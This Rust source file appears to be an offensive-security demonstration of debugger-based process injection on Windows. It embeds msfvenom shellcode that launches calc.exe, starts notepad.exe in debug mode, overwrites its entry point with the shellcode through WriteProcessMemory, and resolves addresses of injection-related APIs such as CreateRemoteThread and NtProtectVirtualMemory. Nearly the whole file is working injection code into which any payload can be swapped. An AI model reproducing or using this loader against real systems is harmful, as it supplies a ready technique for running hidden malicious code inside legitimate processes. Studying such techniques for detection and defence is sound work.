use std::{
    ffi::{c_void, OsStr},
    iter::once,
    mem::size_of,
    os::windows::ffi::OsStrExt,
};
use windows::{
    core::{s, Result, PWSTR},
    Win32::{
        Foundation::{DBG_CONTINUE, EXCEPTION_BREAKPOINT, HANDLE},
        System::{Diagnostics::Debug::*, Threading::*},
    },
};

fn main() -> Result<()> {
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    let mut pi = PROCESS_INFORMATION::default();
    let mut dbg = DEBUG_EVENT::default();
    let si = STARTUPINFOW { cb: size_of::<STARTUPINFOW>() as u32, ..Default::default()};

    // Create the command line as a wide string for the target process
    let mut path = OsStr::new("C:\\Windows\\System32\\notepad.exe")
        .encode_wide()
        .chain(once(0))
        .collect::<Vec<u16>>();

    unsafe {
        // Create a process in debug mode
        CreateProcessW(
            None,
            PWSTR(path.as_mut_ptr()),
            None,
            None,
            false,
            DEBUG_ONLY_THIS_PROCESS,
            None,
            None,
            &si,
            &mut pi,
        )?;

        // Wait for a series of debug events (threads, DLLs, etc.)
        for i in 0..7 {
            if WaitForDebugEvent(&mut dbg, 5000).is_ok() {
                match dbg.dwDebugEventCode {
                    // Fired when the process starts
                    CREATE_PROCESS_DEBUG_EVENT => {
                        println!("[+] Process PID: {}", dbg.dwProcessId);
                        println!("[+] Thread TID: {}", dbg.dwThreadId);
                        println!("[+] StartAddress: {:?}", dbg.u.CreateProcessInfo.lpStartAddress);
                        println!("[+] Process Main Thread: {:?}", dbg.u.CreateProcessInfo.hThread);
                    }

                    // Fired when a new thread is created in the debugged process
                    CREATE_THREAD_DEBUG_EVENT => {
                        println!("\n[+] Thread Created: {:?}", dbg.u.CreateThread.lpStartAddress);
                        println!("[+] Thread HANDLE: {:?}", dbg.u.CreateThread.hThread);
                        println!("[+] Thread ThreadLocalBase: {:?}", dbg.u.CreateThread.lpThreadLocalBase);
                    }

                    // Fired when a DLL is loaded into the target process
                    LOAD_DLL_DEBUG_EVENT => {
                        let mut buffer = [0u8; size_of::<usize>()];
                        let mut return_number = 0;

                        // Read the DLL name pointer from the process memory
                        if ReadProcessMemory(
                            pi.hProcess,
                            dbg.u.LoadDll.lpImageName,
                            buffer.as_mut_ptr().cast(),
                            size_of::<usize>(),
                            Some(&mut return_number),
                        )
                        .is_ok()
                        {
                            let addr = usize::from_ne_bytes(buffer) as *mut c_void;
                            let mut name = vec![0u16; 260];
                            println!("\n[+] DLL ADDRESS: {:?}", addr);

                            // Read the DLL name string itself
                            if ReadProcessMemory(
                                pi.hProcess,
                                addr,
                                name.as_mut_ptr().cast(),
                                name.len(),
                                Some(&mut return_number),
                            )
                            .is_ok()
                            {
                                if let Some(first_null) = name.iter().position(|&c| c == 0) {
                                    name.truncate(first_null);
                                }

                                println!("[+] DLL Name: {}", String::from_utf16_lossy(&name).trim_end_matches('\0'));
                            }
                        }

                        println!("[+] DLL Base Address: {:?}", dbg.u.LoadDll.lpBaseOfDll);
                        println!("[+] DLL H_File: {:?}", dbg.u.LoadDll.hFile);
                    }

                    // Fired when an exception occurs — we look for the initial breakpoint
                    EXCEPTION_DEBUG_EVENT => {
                        if dbg.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT {
                            println!("[+] Breakpoint was successfully triggered");
                        }
                    }
                    _ => {}
                }

                if i == 6 {
                    // Inject shellcode at the recorded start address
                    let mut number_of_write = 0;
                    WriteProcessMemory(
                        pi.hProcess,
                        std::mem::transmute(dbg.u.CreateProcessInfo.lpStartAddress),
                        shellcode.as_ptr().cast(),
                        shellcode.len(),
                        Some(&mut number_of_write),
                    )?;

                    // Stop debugging after injection
                    DebugActiveProcessStop(pi.dwProcessId)?;
                }
            }

            // Continue to the next debug event unless it's the final step
            if i < 6 {
                ContinueDebugEvent(pi.dwProcessId, pi.dwThreadId, DBG_CONTINUE)?;
            }
        }

        // Example of resolving symbol addresses dynamically
        let mut symbol = SYMBOL_INFO { SizeOfStruct: size_of::<SYMBOL_INFO>() as u32, ..Default::default()};
        SymInitialize(HANDLE(-1isize), None, true).expect("[!] SymInitialize Failed With Status");

        SymFromName(HANDLE(-1isize), s!("VirtualAllocEx"), &mut symbol).expect("[!] SymFromName Failed With Status ");
        println!("\n[+] Example Address VirtualAllocEx: {:x?}", symbol.Address);
        
        SymFromName(HANDLE(-1isize), s!("CreateRemoteThread"), &mut symbol).expect("[!] SymFromName Failed With Status ");
        println!("[+] Example Address CreateRemoteThread: {:x?}", symbol.Address);

        SymFromName(HANDLE(-1isize), s!("NtProtectVirtualMemory"), &mut symbol).expect("[!] SymFromName Failed With Status ");
        println!("[+] Example Address NtProtectVirtualMemory: {:x?}", symbol.Address);
    };

    Ok(())
}
